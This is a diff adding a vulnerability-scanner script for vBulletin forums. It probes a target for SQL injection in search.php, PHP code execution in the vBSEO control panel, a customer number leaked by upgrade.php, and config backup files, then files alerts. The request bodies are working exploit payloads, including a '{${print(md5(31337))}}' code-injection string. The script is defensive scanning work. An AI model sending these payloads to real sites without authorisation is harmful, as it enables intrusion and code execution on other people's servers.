@@ -1,0 +1,139 @@
+#include helpers.inc;
+#include backup_file_variants.inc;
+#include reporting_helpers.inc;
+#include webapp_config_backup.inc;
+// **************************************************************************************							 
+function alert(uri, vxml, job, details)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	if (details) ri.details = details;
+	addHTTPJobToCrawler(job, 1, 1);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function test_vb4_search_cat(dir, uri)
+{
+	//trace(uri);
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/search.php?do=process';		
+	lastJob.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);
+	
+	lastJob.request.body = 'contenttypeid=7&do=process&humanverify=1&cat[]=)';
+	
+	lastJob.execute();
+	
+	//trace(lastJob.responseStatus);
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 503 && lastJob.response.body.indexOf('Database error in vBulletin') != -1 && lastJob.response.body.indexOf('You have an error in your SQL syntax') != -1)
+		{
+				// successful
+				alert(uri, 'vbulletin4_search_cat.xml', lastJob);
+				return true;				
+		}
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+function test_vbseo_360_phpexec(dir, uri)
+{
+	//trace(uri);
+	lastJob = new THTTPJob();
+	lastJob.verb = "POST";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/vbseocp.php';		
+	lastJob.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);
+	
+	lastJob.request.body = 'char_repl=\'{${print(md5(31337))}}\'%3D%3E';
+	
+	lastJob.execute();
+	
+	//trace(lastJob.responseStatus);
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.response.body.indexOf('6f3249aa304055d63828af3bfab778f6') != -1)
+		{
+				// successful
+				alert(lastJob.uri, 'vbseo_360_phpcode_exec.xml', lastJob);
+				return true;				
+		}
+	}		
+	
+	return false;
+}
+/***********************************************************************************/
+function test_vb45_custnumber_leak(dir, uri)
+{
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/install/upgrade.php';		
+	
+	lastJob.execute();
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200 && lastJob.response.body.indexOf('var CUSTNUMBER =') != -1)
+		{
+				var regex = /var CUSTNUMBER = "(\w{32})";/i;
+				var e = regex.exec(lastJob.response.body);
+        		if (e && e[1]) {
+					// successful
+					var details = "Customer number: [dark]" + e[1] + "[/dark]";
+					alert(uri, 'vbulletin_leaked_customer_number.xml', lastJob, details);
+					return true;
+				}
+		}
+	}
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = dir.url;
+	lastJob.uri  = uri + '/core/install/upgrade.php';		
+	
+	lastJob.execute();
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200 && lastJob.response.body.indexOf('var CUSTNUMBER =') != -1)
+		{
+				var regex = /var CUSTNUMBER = "(\w{32})";/i;
+				var e = regex.exec(lastJob.response.body);
+        		if (e && e[1]) {
+					// successful
+					var details = "Customer number: [dark]" + e[1] + "[/dark]";
+					alert(uri, 'vbulletin_leaked_customer_number.xml', lastJob, details);
+					return true;
+				}
+		}
+	}
+	return false;
+}
+/***********************************************************************************/
+/* main */
+/***********************************************************************************/	
+var dir = getCurrentDirectory(); 
+if (dir)
+{
+	var alreadyReportedWebApplication = getGlobalValue("detectedAppvBulletin");
+	if (!alreadyReportedWebApplication)
+	{
+	    setGlobalValue("detectedAppvBulletin", 1, true);           
+	    KBase("vBulletin web application", "vBulletin web application was detected in directory [dark][bold]" + dir.fullPath + "[/bold][/dark].");
+	}
+	test_vb45_custnumber_leak(dir, dir.fullPath);
+	
+	test_vbseo_360_phpexec(dir, dir.fullPath);
+	test_vb4_search_cat(dir, dir.fullPath);
+    
+	// test for config file backup files
+  	testConfigFileBackupFile(dir, dir.fullPath + "/includes", "config", "php");
+}
